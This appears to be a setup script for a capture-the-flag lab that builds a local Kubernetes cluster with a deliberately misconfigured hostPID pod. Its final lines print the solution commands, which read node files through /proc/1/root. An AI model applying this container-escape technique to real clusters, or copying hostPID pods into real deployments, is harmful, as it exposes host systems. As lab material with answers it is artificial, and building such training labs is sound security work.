#!/bin/bash
set -euo pipefail
CLUSTER_NAME="chain25-hostpid-to-node"
FLAG_DIR="/home/kianabin/cve-flags/chain25"
FLAG1="${CVE_FLAG1:-flag{chain25-step1-hostpid\}}"
FLAG2="${CVE_FLAG2:-flag{chain25-step2-escape-final\}}"
mkdir -p "$FLAG_DIR"

echo "[Chain-25] hostPID to Node Control (2 steps)"
echo "[*] Deploying infrastructure..."

cat > /tmp/chain25-kind-config.yaml << 'YAML'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraMounts:
      - hostPath: /home/kianabin/cve-flags/chain25
        containerPath: /host-flag
YAML

kind create cluster --name "$CLUSTER_NAME" --config /tmp/chain25-kind-config.yaml
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10
kind load docker-image alpine:latest --name "$CLUSTER_NAME" 2>/dev/null || true

echo "$FLAG1" > "$FLAG_DIR/flag.txt"

kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: locked-down-pod
spec:
  hostPID: true
  containers:
    - name: app
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        privileged: false
        runAsUser: 0
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
YAML

kubectl wait --for=condition=Ready pod/locked-down-pod --timeout=60s 2>/dev/null || true
sleep 5

# Final flag on the node - reachable only through the hostPID /proc view
NODE_CONTAINER=$(docker ps --filter "name=${CLUSTER_NAME}-control-plane" --format '{{.Names}}' 2>/dev/null || echo "")
if [ -n "$NODE_CONTAINER" ]; then
  docker exec "$NODE_CONTAINER" sh -c "echo '$FLAG2' > /etc/chain25_final_flag" 2>/dev/null || true
fi

echo ""
echo "[+] Chain-25 Ready"
echo "    Cluster: $CLUSTER_NAME"
echo "    Step 1: kubectl exec locked-down-pod -- cat /proc/1/root/host-flag/flag.txt"
echo "    Step 2: kubectl exec locked-down-pod -- cat /proc/1/root/etc/chain25_final_flag"
